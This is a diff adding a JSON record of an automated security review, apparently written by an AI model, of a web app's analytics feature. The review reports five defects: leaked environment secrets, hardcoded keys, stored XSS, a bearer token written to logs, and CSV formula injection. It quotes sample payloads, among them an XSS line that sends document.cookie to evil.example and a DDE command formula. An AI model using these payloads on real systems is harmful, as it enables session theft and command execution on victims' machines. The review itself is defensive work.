@@ -1,0 +1,64 @@
+{
+  "review": {
+    "summary": "Five security defects, four of them critical. The build config inlines the entire server environment (including JWT_SECRET) into the client bundle, and a committed config file holds a signing secret that is additionally imported into client code. The admin analytics page renders user-submitted comment text with dangerouslySetInnerHTML (stored XSS), the view endpoint logs the raw Authorization header, and the CSV export does not defend against formula injection.",
+    "findings": [
+      {
+        "file": "client/vite.config.js",
+        "start_line": 12,
+        "end_line": 13,
+        "severity": "CRITICAL",
+        "category": "security",
+        "title": "Vite `define` inlines the whole server environment (all secrets) into the client bundle",
+        "rationale": "`define: { 'process.env': JSON.stringify(process.env) }` inlines the *entire* build-time environment object into the client bundle (Vite performs a literal token replacement, so any `process.env.*` reference in app or dependency code becomes a reference into the full serialized env). Attacker input: none — any anonymous visitor can `GET` the built JS asset and read `JWT_SECRET`, database credentials, and any other server secret present at build time, then forge admin JWTs. The comment 'expose env to analytics config' shows the intent, but the scope is the whole environment, not one value.",
+        "suggestion": "Remove the `define` block. If a single non-secret value is needed in the client, expose it explicitly via `import.meta.env.VITE_*` and never serialize `process.env`."
+      },
+      {
+        "file": "server/src/configs/analytics.js",
+        "start_line": 2,
+        "end_line": 3,
+        "severity": "CRITICAL",
+        "category": "security",
+        "title": "Hardcoded secrets committed and imported into the client bundle",
+        "rationale": "Two live-looking credentials are committed: `EXPORT_SIGNING_SECRET = 'qb_exp_9f3c2a71b4e8d05c6a1f7e2b9d4c8a3f'` and `SEGMENT_WRITE_KEY = 'sk_seg_4e1b7c9d2a6f3e8b5c0d1a2f3e4b5c6d'`. The in-file comment 'test fixture — safe to commit' is an unverified claim, not a mitigation, and the PR description does not support it. Worse, `client/src/components/admin/analytics/ExportButton.jsx:5` does `import { EXPORT_SIGNING_SECRET } from '../../../../../server/src/configs/analytics.js'`, so the HMAC signing secret is bundled into client JavaScript and shipped to every browser. Attacker input: any visitor reads the signing key out of the bundle and can forge `X-Export-Signature` values for arbitrary CSV payloads; anyone with repo access gets the Segment write key. This also violates spec AC-10.1 ('No secrets... shall be committed; client code shall never import from server/').",
+        "suggestion": "Delete the file, load both values from `process.env` on the server only, and remove the client import (the client cannot and must not verify a server HMAC)."
+      },
+      {
+        "file": "client/src/components/admin/analytics/tables/RecentCommentsTable.jsx",
+        "start_line": 48,
+        "end_line": 48,
+        "severity": "CRITICAL",
+        "category": "security",
+        "title": "Stored XSS: comment content rendered with dangerouslySetInnerHTML in the admin analytics page",
+        "rationale": "`dangerouslySetInnerHTML={{ __html: truncate(item.contentExcerpt, 50) }}` renders comment text as HTML. `contentExcerpt` is derived server-side from `Comment.content`, which is written by the unauthenticated public comment form (`POST /api/blog/add-comment`). `truncate` only slices the string — it does not strip tags. Attacker input: submit a comment whose body is `<img src=x onerror=fetch('//evil.example/'+document.cookie)>` (30 chars, fits the 50-char slice); when an admin opens the Analytics page the payload executes in the admin origin with the admin's session/token. This is stored XSS and directly contradicts spec AC-4.3 ('plain-text excerpt... never rendered as HTML').",
+        "suggestion": "Render `{truncate(item.contentExcerpt, 50)}` as a text child (React escapes it), or sanitize with a vetted HTML sanitizer if markup is genuinely required."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 708,
+        "end_line": 708,
+        "severity": "CRITICAL",
+        "category": "security",
+        "title": "Bearer token written to logs on every view request",
+        "rationale": "`console.log('[analytics] auth header:', req.headers.authorization)` writes the full `Authorization: Bearer <JWT>` header to stdout on every view request. Attacker input: none directly — but anyone with read access to application logs (log aggregator, CI output, shared hosting, support tooling) obtains a valid admin/author bearer token and can replay it against `/api/admin/*` until it expires. Spec AC-10.2 explicitly forbids writing authorization headers or tokens to logs.",
+        "suggestion": "Delete the log line; if diagnostics are needed, log only a boolean such as `isAdminView`."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 577,
+        "end_line": 584,
+        "severity": "WARNING",
+        "category": "security",
+        "title": "CSV formula injection: escapeCSV does not neutralize leading =, +, -, @",
+        "rationale": "`escapeCSV` only quotes cells containing `,`, `\"` or `\\n`; it never neutralizes spreadsheet formula prefixes. Attacker input: a blog title such as `=HYPERLINK(\"http://evil.example\",\"open\")` or `=cmd|'/c calc'!A0` (titles are attacker-influenced content). When an admin clicks 'Export CSV' and opens the file in Excel/LibreOffice/Sheets, the cell is evaluated as a formula, enabling data exfiltration or DDE command execution on the admin's machine. Spec AC-5.6 requires any cell starting with `=`, `+`, `-` or `@` to be prefixed with a single quote.",
+        "suggestion": "In `escapeCSV`, prefix the value with `'` when `/^[=+\\-@\\t\\r]/` matches before applying the quote/comma/newline escaping."
+      }
+    ],
+    "verdict": "request_changes"
+  },
+  "model": "deepseek/deepseek-v4.1-flash",
+  "tokensIn": 73657,
+  "tokensOut": 6669,
+  "costUsd": 0.00753783,
+  "ms": 21952,
+  "recordedAt": "2026-11-21T08:30:31.147Z"
+}
